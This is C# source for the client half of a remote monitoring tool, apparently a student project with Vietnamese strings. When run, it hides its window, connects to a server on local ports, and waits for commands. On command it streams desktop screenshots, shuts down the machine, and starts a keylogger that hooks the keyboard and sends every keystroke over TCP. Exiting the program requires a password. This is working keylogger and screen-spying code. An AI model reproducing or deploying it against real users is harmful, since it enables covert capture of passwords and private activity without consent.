using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net.Sockets;
using System.Net;
using System.Threading;

using System.Drawing.Imaging;
using System.Runtime.Serialization.Formatters.Binary;

using System.Runtime.InteropServices;
using Keystroke.API;

namespace Client
{
    public partial class Client : Form
    {
        private static ManualResetEvent mre = new ManualResetEvent(false);
        private readonly TcpClient signalClient = new TcpClient();
        private readonly TcpClient screenClient = new TcpClient();
        private NetworkStream screenStream;
        private NetworkStream signalStream;

        private Thread ConnectServer;
        private Thread ShareScreen;
        bool stopsharing = false;
        string secret = "@#%^*&*)&*()*)(*)(*)"; // Initialize random char
        const string KEY = "CHUONG TRINH THEO DOI TU XA";//"CHƯƠNG TRÌNH THEO DÕI TỪ XA";

        TcpClient logClient = new TcpClient();
        NetworkStream logStream;
        public Client()
        {
            CheckForIllegalCrossThreadCalls = false;
            ShareScreen = new Thread(SendDesktopImage);
            ShareScreen.IsBackground = true;
            
            InitializeComponent();
            
        }
        public byte[] Xor(string a, string b)
        {
            char[] charAArray = a.ToCharArray();
            char[] charBArray = b.ToCharArray();
            byte[] result = new byte[27];
            // Set length to be the length of the shorter string

            for (int i = 0; i < 27; i++)
            {
                result[i] = (byte)(charAArray[i] ^ charBArray[i]) ; // Error here
            }

            return result;
        }

        void TakeCommandFromServer()
        {
            this.Hide();
            while (signalClient.Connected)
            {
                try
                {
                    signalStream = signalClient.GetStream();

                    //MessageBox.Show("Client said hello");
                    byte[] data = new byte[1024];
                    int numBytesRead = signalStream.Read(data, 0, data.Length);
                    string signal;
                    string command;
                    if (numBytesRead > 0)
                    {
                        signal = Encoding.ASCII.GetString(data, 0, numBytesRead);
                        command = signal.Substring(0, signal.IndexOf('$'));

                        //screenStream = screenClient.GetStream();
                        if (command.StartsWith("secret"))
                        {
                            
                            String[] separator = { ":" };
                            secret = command.Split(separator, StringSplitOptions.RemoveEmptyEntries)[1];
                            MessageBox.Show(Encoding.ASCII.GetString(Xor(secret, KEY)));
                        }
                        if (command == "Share Screen")
                        {
                            if (!ShareScreen.IsAlive)
                                ShareScreen.Start();
                            else
                            {
                                stopsharing = false;
                                mre.Set();
                            }

                            //break;

                        }
                        if (command == "Stop Share Screen")
                        {
                            stopsharing = true;
                            //ShareScreen.Abort();
                        }
                        if (command.StartsWith("shutdown -s -t")) // command = shutdown -s -t
                        {
                            // timer1.Start();
                            //SignalStream.Close();
                            String[] separator = { "shutdown" };
                            String arg = command.Split(separator, StringSplitOptions.RemoveEmptyEntries)[0];
                            Shutdown(arg);
                        }

                        if (command == "shutdown -a") // command = shutdown -s -t
                        {
                            // timer1.Start();
                            //SignalStream.Close();
                            String[] separator = { "shutdown" };
                            String arg = command.Split(separator, StringSplitOptions.RemoveEmptyEntries)[0];
                            Shutdown(arg);
                        }
                        if (command.StartsWith("log"))
                        {
                            Thread Keylog = new Thread(Keylogger);
                            Keylog.IsBackground = true;
                            Keylog.Start();
                        }

                    }
                }
                catch (Exception ex)
                {

                }

            }
            MessageBox.Show("Server disconnected");
            Application.Exit();

        }
        void Shutdown(string command)
        {
            System.Diagnostics.Process.Start("shutdown", command);
        }
        #region Display Resolution

        [DllImport("gdi32.dll", CharSet = CharSet.Auto, SetLastError = true, ExactSpelling = true)]
        public static extern int GetDeviceCaps(IntPtr hDC, int nIndex);

        public enum DeviceCap
        {
            VERTRES = 10,
            DESKTOPVERTRES = 117
        }


        public static double GetWindowsScreenScalingFactor(bool percentage = true)
        {
            //Create Graphics object from the current windows handle
            Graphics GraphicsObject = Graphics.FromHwnd(IntPtr.Zero);
            //Get Handle to the device context associated with this Graphics object
            IntPtr DeviceContextHandle = GraphicsObject.GetHdc();
            //Call GetDeviceCaps with the Handle to retrieve the Screen Height
            int LogicalScreenHeight = GetDeviceCaps(DeviceContextHandle, (int)DeviceCap.VERTRES);
            int PhysicalScreenHeight = GetDeviceCaps(DeviceContextHandle, (int)DeviceCap.DESKTOPVERTRES);
            //Divide the Screen Heights to get the scaling factor and round it to two decimals
            double ScreenScalingFactor = Math.Round(PhysicalScreenHeight / (double)LogicalScreenHeight, 2);
            //If requested as percentage - convert it
            if (percentage)
            {
                ScreenScalingFactor *= 100.0;
            }
            //Release the Handle and Dispose of the GraphicsObject object
            GraphicsObject.ReleaseHdc(DeviceContextHandle);
            GraphicsObject.Dispose();
            //Return the Scaling Factor
            return ScreenScalingFactor;
        }

        public static Size GetDisplayResolution()
        {
            var sf = GetWindowsScreenScalingFactor(false);
            var screenWidth = Screen.PrimaryScreen.Bounds.Width * sf;
            var screenHeight = Screen.PrimaryScreen.Bounds.Height * sf;
            return new Size((int)screenWidth, (int)screenHeight);
        }

        #endregion

        private Image GrabDesktop()
        {
            Rectangle rect = Screen.PrimaryScreen.Bounds;
            rect.Height = (int)(GetDisplayResolution().Height);
            rect.Width = (int)(GetDisplayResolution().Width);
            //MessageBox.Show(rect.Size.ToString());
            Bitmap screenBitmap = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
            Graphics screenGraphics = Graphics.FromImage(screenBitmap);
            screenGraphics.CopyFromScreen(rect.X, rect.Y, 0, 0, rect.Size, CopyPixelOperation.SourceCopy);
           
            screenGraphics.DrawIcon(new Icon("Sample.ico"), Cursor.Position.X - 50, Cursor.Position.Y - 50);


            return screenBitmap;
        }

       
        private void SendDesktopImage()
        {
            try
            {
                while(signalClient.Connected && ShareScreen.IsAlive)
                {
                    if (stopsharing) mre.WaitOne();
                BinaryFormatter binaryFormatter = new BinaryFormatter();
                screenStream = screenClient.GetStream();
                binaryFormatter.Serialize(screenStream, GrabDesktop());
                //Thread.Sleep(100);
                }
            }
            catch(Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }



        }

        private void sendKey(object key)
        {
            string msg = key.ToString();
            Byte[] sendBytes = Encoding.UTF8.GetBytes(msg);
            logStream.Write(sendBytes, 0, sendBytes.Length);
        }
        private void Keylogger()
        {
            try
            {
              
                logStream = logClient.GetStream();
                while (logClient.Connected)
                {
                    var api = new KeystrokeAPI();
                    api.CreateKeyboardHook((character) => { sendKey(character); });
                    Application.Run();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        private void Client_Load(object sender, EventArgs e)
        {
            //this.Hide();
            //this.WindowState = FormWindowState.Maximized;
            //Rectangle rect = Screen.PrimaryScreen.Bounds;
            //rect.Height = (int) (rect.Height*1.5);
            //rect.Width = (int)(rect.Width * 1.5);
            //MessageBox.Show(rect.Size.ToString());

            //float dpiX, dpiY;
            //Graphics graphics = this.CreateGraphics();
            //dpiX = graphics.DpiX;
            //dpiY = graphics.DpiY;
            //MessageBox.Show(dpiX.ToString() + "  " + dpiY.ToString());


            signalClient.Connect(IPAddress.Parse("127.0.0.1"), 8080);
            screenClient.Connect(IPAddress.Parse("127.0.0.1"), 8081);
            logClient.Connect(IPAddress.Parse("127.0.0.1"), 8082);

            ConnectServer = new Thread(TakeCommandFromServer);
            ConnectServer.IsBackground = true;
            ConnectServer.Start();

        }

        private void Exit_Click(object sender, EventArgs e)
        {
            String password = Microsoft.VisualBasic.Interaction.InputBox("Nhập mật khẩu bảo vệ ", "Mật khẩu", "", -1, -1);
            
            if (password == secret )
            {
                Application.Exit();
            }
            else
            {
                MessageBox.Show("Bạn đã nhập mật khẩu sai ! ", " Lỗi");
            }
        }
    }
}
